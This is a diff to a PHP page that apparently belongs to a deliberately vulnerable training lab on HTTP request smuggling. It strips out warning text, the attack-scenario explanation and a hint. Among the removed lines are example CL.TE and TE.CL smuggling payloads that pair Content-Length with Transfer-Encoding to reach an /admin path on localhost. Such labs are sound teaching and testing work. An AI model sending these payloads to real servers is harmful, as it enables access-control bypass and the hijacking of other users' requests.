@@ -36,19 +36,12 @@ if( isset( $_POST['test_request'] ) ) {
 	
 	if($has_cl && $has_te) {
 		$smugglingHtml .= "<div style=\"background: #ffe6e6; padding: 15px; border: 2px solid #ff0000; border-radius: 5px; margin: 10px 0;\">";
-		$smugglingHtml .= "<h4 style=\"color: #cc0000;\">⚠️ VULNERABLE: Conflicting Headers Detected!</h4>";
 		$smugglingHtml .= "<p><strong>Both Content-Length and Transfer-Encoding are present!</strong></p>";
-		$smugglingHtml .= "<p>This can cause desynchronization between frontend and backend servers.</p>";
+
 		$smugglingHtml .= "<ul>";
 		foreach($headers_info as $info) {
 			$smugglingHtml .= "<li>" . htmlspecialchars($info) . "</li>";
 		}
-		$smugglingHtml .= "</ul>";
-		$smugglingHtml .= "<p><strong>Attack Scenario:</strong></p>";
-		$smugglingHtml .= "<ul>";
-		$smugglingHtml .= "<li>If frontend uses Content-Length ($cl_value bytes) but backend uses Transfer-Encoding ($te_value)</li>";
-		$smugglingHtml .= "<li>Attacker can smuggle a second request in the body</li>";
-		$smugglingHtml .= "<li>The smuggled request will be processed as the next user's request</li>";
 		$smugglingHtml .= "</ul>";
 		$smugglingHtml .= "</div>";
 	} else if($has_cl) {
@@ -65,10 +58,10 @@ if( isset( $_POST['test_request'] ) ) {
 }
 
 $smugglingHtml .= "
-<form method=\"POST\" style=\"margin-top: 20px;\">
+<div class=\"vulnerable_code_area\">
+<form method=\"POST\">
 	<fieldset>
-		<legend>Test HTTP Request</legend>
-		<p>Enter a raw HTTP request to test for smuggling vulnerabilities:</p>
+		<p>Enter a raw HTTP request:</p>
 		<textarea name=\"request_data\" rows=\"15\" cols=\"80\" style=\"font-family: monospace; width: 100%; max-width: 800px;\">POST /api/process HTTP/1.1
 Host: vulnerable-site.com
 Content-Type: application/x-www-form-urlencoded
@@ -84,39 +77,8 @@ Host: vulnerable-site.com
 		<p>
 			<button type=\"submit\" name=\"test_request\">Analyze Request</button>
 		</p>
-		<p style=\"color: #666;\"><em>Try modifying Content-Length and Transfer-Encoding headers to see how conflicting headers can be exploited.</em></p>
 	</fieldset>
 </form>
-
-<div style=\"margin-top: 20px; padding: 15px; background: #e7f3ff; border: 1px solid #2196f3; border-radius: 5px;\">
-	<h4>Example Smuggling Payloads:</h4>
-	<p><strong>CL.TE Attack:</strong> Frontend uses Content-Length, Backend uses Transfer-Encoding</p>
-	<pre style=\"background: white; padding: 10px; overflow-x: auto;\">POST / HTTP/1.1
-Host: vulnerable-site.com
-Content-Length: 45
-Transfer-Encoding: chunked
-
-0
-
-GET /admin HTTP/1.1
-Host: localhost
-
-</pre>
-	<p><strong>TE.CL Attack:</strong> Frontend uses Transfer-Encoding, Backend uses Content-Length</p>
-	<pre style=\"background: white; padding: 10px; overflow-x: auto;\">POST / HTTP/1.1
-Host: vulnerable-site.com
-Content-Length: 6
-Transfer-Encoding: chunked
-
-3c
-GET /admin HTTP/1.1
-Host: localhost
-Content-Length: 10
-
-x=
-0
-
-</pre>
 </div>";
 
 ?>
